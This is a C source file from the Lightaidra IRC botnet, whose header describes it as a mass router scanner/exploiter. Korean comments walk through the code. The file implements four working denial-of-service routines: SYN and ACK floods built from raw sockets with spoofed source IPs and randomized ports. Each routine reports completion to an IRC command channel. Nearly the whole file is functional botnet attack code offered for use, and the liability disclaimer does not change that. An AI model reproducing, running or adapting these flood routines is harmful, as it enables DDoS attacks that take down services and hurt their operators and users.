// UTF-8 인코딩

/*
 * attacks.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

unsigned int get_spoofed();
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int sockwrite(int sd, const char *fmt, ...);


/* synflood(), ngsynflood(), ackflood(), ngackflood() */
/* these functions are adapted from ktx.c             */
void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

	/* 먼저 소켓을 만들기 */
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;

	/* IP 패킷과 TCP 패킷 형성1 */
	/* 패킷의 체크섬을 계산하기 위하여, attack.h에 슈도 헤더 구조를 정의함*/
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 64;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.doff = 10;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;
    dest = htons(dest_port); // 목적지 포트

    while (1) {
		/* 소스포트와 목적지 포트를 랜덤한 값으로 설정해서 위조시킴  */
        source = rand();

        if (dest_port == 0) dest = rand();
        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

		/* IP 패킷과 TCP 패킷 형성2 */
		/* 위조된 데이터 값들로 변경해야 하는 필드들을 설정 */
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.saddr = saddr; // 소스 IP 주소
        send_tcp.ip.daddr = daddr; // 목적지 IP 주소
        send_tcp.ip.check = 0;		// 체크섬을 계산하기 전에 0으로 셋팅
        send_tcp.tcp.source = source; // source 포트
        send_tcp.tcp.dest = dest; // 위조된 목적지 포트
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.check = 0;

		/* sockaddr_in 구조체(sin 구조체)를 만들고 위조된 데이터를 채운다 */
        sin.sin_family = AF_INET;
        sin.sin_port = dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;

		/* IP 체크섬 계산 */
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = rand();
        send_tcp.buf[9] = ((char *)&check)[0];
        send_tcp.buf[10] = ((char *)&check)[1];
        send_tcp.buf[11] = ((char *)&check)[2];
        send_tcp.buf[12] = ((char *)&check)[3];

		/* 슈도 헤더 필드들 설정*/
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);

        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		/*  TCP/IP 헤더의 체크섬을 계산한다 */
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
		/* sendto()함수를 사용하여서 목적하는 곳으로 패킷을 보낸다. */
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

		/* synflooding이 성공했을때*/
        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[nsynflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    exit(EXIT_FAILURE);
}

void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

	/* 먼저 소켓을 만들기 */
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;

	/* IP 패킷과 TCP 패킷 형성1 */
	/* 패킷의 체크섬을 계산하기 위하여, attack.h에 슈도 헤더 구조를 정의함*/
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 64;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.doff = 10;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;
    dest = htons(dest_port);	// 목적지 포트

    while (1) {
		/* 소스포트와 목적지 포트를 랜덤한 값으로 설정해서 위조시킴  */
        source = rand();
        if (dest_port == 0) dest = rand();

        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

		/* IP 패킷과 TCP 패킷 형성2 */
		/* 위조된 데이터 값들로 변경해야 하는 필드들을 설정 */
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.saddr = saddr;	// 소스 IP 주소
        send_tcp.ip.daddr = daddr;	// 목적지 IP 주소
        send_tcp.ip.check = 0;	// 체크섬을 계산하기 전에 0으로 셋팅
        send_tcp.tcp.source = source;	// source 포트
        send_tcp.tcp.dest = dest;	// 위조된 목적지 포트
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.check = 0;

		/* sockaddr_in 구조체(sin 구조체)를 만들고 위조된 데이터를 채운다 */
        sin.sin_family = AF_INET;
        sin.sin_port = dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;

		/* IP 체크섬 계산 */
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = rand();
        send_tcp.buf[9] = ((char *)&check)[0];
        send_tcp.buf[10] = ((char *)&check)[1];
        send_tcp.buf[11] = ((char *)&check)[2];
        send_tcp.buf[12] = ((char *)&check)[3];

		/* 슈도 헤더 필드들 설정*/
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);

        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		/*  TCP/IP 헤더의 체크섬을 계산한다 */
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
		/* sendto()함수를 사용하여서 목적하는 곳으로 패킷을 보낸다. */
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));
    
		/* synflooding이 성공했을때 */
        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ngsynflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    exit(EXIT_FAILURE);
}

void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

	/* 먼저 소켓을 만들기 */
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        for (i = 0; i < 20; i++)
            send_tcp.buf[i] = (u_char) syn[i];
    }

    daddr = dest_addr;
    secs = ntime;
    dest = htons(dest_port); // 목적지 포트

	/* IP 패킷과 TCP 패킷 형성1 */
	/* 패킷의 체크섬을 계산하기 위하여, attack.h에 슈도 헤더 구조를 정의함 */
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 1;
    send_tcp.tcp.psh = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 0;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;

    while (1) {
		/* 소스포트와 목적지 포트를 랜덤한 값으로 설정해서 위조시킴  */
        if (dest_port == 0) dest = rand();
        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

		/* IP 패킷과 TCP 패킷 형성2 */
		/* 위조된 데이터 값들로 변경해야 하는 필드들을 설정 */
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.check = 0;
        send_tcp.ip.saddr = saddr;	// 소스 IP 주소
        send_tcp.ip.daddr = daddr;	// 목적지 IP 주소
        send_tcp.tcp.source = rand();	// source 포트(랜덤)
        send_tcp.tcp.dest = dest;	// 위조된 목적지 포트
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.ack_seq = rand();
        send_tcp.tcp.check = 0;	// 체크섬을 계산하기 전에 0으로 셋팅

		/* sockaddr_in 구조체(sin 구조체)를 만들고 위조된 데이터를 채운다 */
        sin.sin_family = AF_INET;
        sin.sin_port = send_tcp.tcp.dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;

		/* IP 체크섬 계산 */
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = in_cksum((unsigned short *)&send_tcp, 40);

		/* 슈도 헤더 필드들 설정*/
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);

        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		/*  TCP/IP 헤더의 체크섬을 계산한다 */
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
		/* sendto()함수를 사용하여서 목적하는 곳으로 패킷을 보낸다. */
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

		/* flooding이 성공했을때*/
        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ackflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");

    exit(EXIT_FAILURE);
}

void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

	/* 먼저 소켓을 만들기 */
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;
    dest = htons(dest_port); // 목적지 포트

	/* IP 패킷과 TCP 패킷 형성1 */
	/* 패킷의 체크섬을 계산하기 위하여, attack.h에 슈도 헤더 구조를 정의함*/
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 1;
    send_tcp.tcp.psh = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 0;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;

    while (1) {
		/* 소스포트와 목적지 포트를 랜덤한 값으로 설정해서 위조시킴  */
        if (dest_port == 0) dest = rand();

        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

		/* IP 패킷과 TCP 패킷 형성2 */
		/* 위조된 데이터 값들로 변경해야 하는 필드들을 설정 */
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다*/
        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.check = 0;
        send_tcp.ip.saddr = saddr;	// 소스 IP 주소
        send_tcp.ip.daddr = daddr;	// 목적지 IP 주소
        send_tcp.tcp.source = rand();	// source 포트(랜덤)
        send_tcp.tcp.dest = dest;	// 위조된 목적지 포트
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.ack_seq = rand();
        send_tcp.tcp.check = 0;	// 체크섬을 계산하기 전에 0으로 셋팅

		/* sockaddr_in 구조체(sin 구조체)를 만들고 위조된 데이터를 채운다 */
        sin.sin_family = AF_INET;
        sin.sin_port = send_tcp.tcp.dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;

		/* IP 체크섬 계산 */
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = in_cksum((unsigned short *)&send_tcp, 40);

		/* 슈도 헤더 필드들 설정 */
		/* 합법적 인 SYN 패킷처럼 보이도록 할당 된 메모리를 채운다 */
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);

        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		/*  TCP/IP 헤더의 체크섬을 계산한다 */
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
		/* sendto()함수를 사용하여서 목적하는 곳으로 패킷을 보낸다. */
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

		/* flooding이 성공했을때*/
        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ngackflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }
        
        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");

    exit(EXIT_FAILURE);
}
